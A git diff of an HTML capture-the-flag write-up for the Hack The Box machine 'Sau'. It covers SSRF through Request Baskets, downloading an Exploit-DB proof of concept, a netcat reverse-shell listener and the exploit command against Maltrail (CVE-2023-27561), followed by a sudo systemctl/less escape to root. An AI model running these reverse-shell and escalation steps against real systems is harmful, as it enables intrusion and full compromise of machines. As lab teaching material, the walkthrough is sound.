@@ -83,6 +83,8 @@
 
     <!-- ===== OVERVIEW ===== -->
     <h3>Overview</h3>
+    <img src="images/sauhero.png" alt="Sau Hero Image">
+
     <p>
       <strong>Sau</strong> is an Easy-rated Linux box that showcases one of my favorite types of vulnerabilities: <strong>Server-Side Request Forgery (SSRF)</strong>.
       The initial entry point involved exploiting a misconfigured instance of Request Baskets using 
@@ -176,7 +178,7 @@ Nmap done: 1 IP address (1 host up) scanned in 100.38 seconds</code></pre>
 8338/tcp  filtered unknown
 55555/tcp open     unknown</code></pre>
 
-    <img src="path/to/screenshot1.png" alt="Nmap Results Screenshot">
+    <img src="images/saunewbasket.png" alt="sau new basket">
 
     <!-- ===== EXPLOITATION ===== -->
     <h3> Request Baskets SSRF</h3>
@@ -189,11 +191,11 @@ We created a new basket via <code>curl</code>:</p>
 
     <p>We can also do this previous step with the help of burp. Simply turn on your proxy and create a box to capture the request in BURP. I use foxy proxy for this.</p>
 
-    <img src="path/to/burp-screenshot.png" alt="Burp PUT Request Screenshot">
+    <img src="images/saucreate.png" alt="create basket">
 
 <p>Now can can grab the request in burp and send it to repeater</p>
  
-<img src="path/to/burp-screenshot.png" alt="Burp PUT Request Screenshot">
+<img src="images/saubrup1.png" alt="Burp POST Request Screenshot">
 
 <h2>What Happens When You do This?</h2>
 <ul>
@@ -219,7 +221,7 @@ We created a new basket via <code>curl</code>:</p>
 
 <p>Next, we reconfigure our <code>hackbox</code> basket with a <code>PUT</code> request. This sets the <code>forward_url</code> to our attack box, which turns the basket into an SSRF relay:</p>
 
-<img src="path/to/burp-screenshot.png" alt="Burp PUT Request Screenshot">
+<img src="images/saupost.png" alt="Burp PUT Request Screenshot">
 
 <h3>Explanation:</h3>
 <ul>
@@ -300,35 +302,112 @@ We created a new basket via <code>curl</code>:</p>
 
     <!-- ===== SSRF TO MALTRAIL ===== -->
     <h3>SSRF to Maltrail (Port 80)</h3>
-    <p>We updated our basket to forward to <code>127.0.0.1:80</code>, then browsed to the endpoint again.</p>
+    <p>We updated our basket to forward to <code>127.0.0.1:80</code></p>
 
-    <img src="path/to/maltrail-discovered.png" alt="Maltrail Interface via SSRF">
+    <img src="images/sauloopback.png" alt="Maltrail Interface via SSRF">
 
-    <p>This exposed a Maltrail web interface — something we never could’ve reached directly.</p>
+    <p>> This tells the vulnerable app: 
+    Any time someone accesses <code>/hackbox</code>, I want you to make that same request to <strong>your own localhost</strong> on port 80.
+    We’re not scanning from our machine anymore — **we’re telling the vulnerable box to make a local HTTP request to itself**.
+    Now if we visit http://10.129.229.26:55555/hackbox….</p>
+
+ <img src="images/saumaltrail.png" alt="Maltrail reveal">
+
+<p><strong>Revealed an instance of Maltrail v0.53</strong></p>
+
+<h3>Result: We See <strong>Maltrail v0.53</strong> in the Browser</h3>
+
+<ul>
+  <li>The SSRF successfully connected to the internal web service</li>
+  <li>That service was <strong>Maltrail</strong>, which only listens on <code>127.0.0.1</code></li>
+  <li>We now see its login page or dashboard — <strong>without ever having direct access to port 80</strong></li>
+</ul>
+
 
     <!-- ===== RCE ===== -->
     <h3>RCE in Maltrail (CVE-2023-27561)</h3>
-    <p>Maltrail v0.53 is vulnerable to unauthenticated command injection. We used an exploit script to pop a reverse shell:</p>
+    <p>After accessing the internal Maltrail instance through SSRF, we identified the version as <strong>v0.53</strong> — which is known to be vulnerable to <strong>unauthenticated OS command injection</strong> (<code>CVE-2023-27561</code>).</p>
 
-    <pre><code>curl -s https://www.exploit-db.com/download/51676 -o exploit.py</code></pre>
-    <pre><code>nc -lvnp 4444</code></pre>
-    <pre><code>python3 exploit.py 10.10.14.207 4444 http://10.129.229.26:55555/hackbox</code></pre>
+<p>This vulnerability allows us to achieve <strong>Remote Code Execution (RCE)</strong> without needing to log in.</p>
 
-    <p>✅ Shell popped as <code>puma</code>.</p>
+<hr />
 
-    <!-- ===== PRIVESc ===== -->
-    <h3>Privilege Escalation</h3>
-    <p>The user <code>puma</code> had passwordless sudo permissions:</p>
-    <pre><code>sudo -l</code></pre>
-    <pre><code>(ALL) NOPASSWD: /usr/bin/systemctl status trail.service</code></pre>
+<h3>Step 1: Download the Exploit</h3>
+<p>We grabbed the official PoC exploit from Exploit-DB:</p>
 
-    <p>That command opens <code>less</code>, allowing command execution:</p>
+<pre><code>curl -s https://www.exploit-db.com/download/51676 -o exploit.py</code></pre>
+
+<blockquote>
+  <p>This script abuses the <code>sensor_name</code> parameter, which is vulnerable to command injection when processed by the Maltrail backend.</p>
+</blockquote>
+
+<hr />
+
+<h3>Step 2: Start a Reverse Shell Listener</h3>
+<p>On our attack box, we started a listener to catch the shell:</p>
+
+<pre><code>nc -lvnp 4444</code></pre>
+
+<hr />
+
+<h3>Step 3: Fire the Exploit</h3>
+<p>We launched the exploit and passed in:</p>
+
+<ul>
+  <li>Our IP and port for the reverse shell</li>
+  <li>The URL to our SSRF basket (<code>/hackbox</code>), which is still proxying requests to <code>127.0.0.1:80</code></li>
+</ul>
+
+<pre><code>python3 exploit.py 10.10.14.207 4444 http://10.129.229.26:55555/hackbox</code></pre>
+
+<hr />
+
+<h3>Result: Shell as <code>puma</code></h3>
+
+<pre><code>connect to [10.10.14.207] from (UNKNOWN) [10.129.229.26] 4444
+whoami
+puma</code></pre>
+
+<p>We’ve successfully exploited <strong>Maltrail via SSRF</strong>, achieved <strong>RCE</strong>, and gained an initial foothold as user <code>puma</code>.</p>
+
+<hr />
+
+<h3>Privilege Escalation – From <code>puma</code> to <code>root</code></h3>
+
+<p>After landing a shell as user <code>puma</code>, we checked for <strong>sudo permissions</strong>:</p>
+
+<pre><code>sudo -l</code></pre>
+
+<h4>Output:</h4>
+
+<pre><code>(ALL) NOPASSWD: /usr/bin/systemctl status trail.service</code></pre>
+
+<p>This revealed that the <code>puma</code> user can run <code>systemctl status trail.service</code> as <strong>root</strong>, without a password.</p>
+
+<hr />
+
+<h3>Why This Is Important</h3>
+<p>The <code>systemctl status</code> command <strong>pipes its output through <code>less</code></strong>, a pager utility. In vulnerable versions of systemd (like 245, found on this box), the <code>LESSSECURE</code> environment variable isn’t properly enforced.</p>
+
+<p>That means… inside the <code>less</code> pager, we can <strong>break out and spawn a root shell</strong>.</p>
+
+<hr />
+<!-- ===== PRIVESc ===== -->
+<h3>Step-by-Step Privesc</h3>
+
+<ol>
+  <li>Run the allowed command:
     <pre><code>sudo /usr/bin/systemctl status trail.service</code></pre>
+  </li>
+  <li>Once inside the <code>less</code> pager, type:
     <pre><code>!/bin/bash</code></pre>
+    <p>The <code>!</code> tells <code>less</code> to execute a shell command.</p>
+  </li>
+  <li>Now you're root.</li>
+</ol>
 
-    <p>✅ Root shell achieved.</p>
 
-    <img src="path/to/root-confirmed.png" alt="Root Shell Screenshot">
+    <img src="images/sauroot.png" alt="Root Shell Screenshot">
 
     <!-- ===== TAKEAWAYS ===== -->
     <h3>Takeaways</h3>
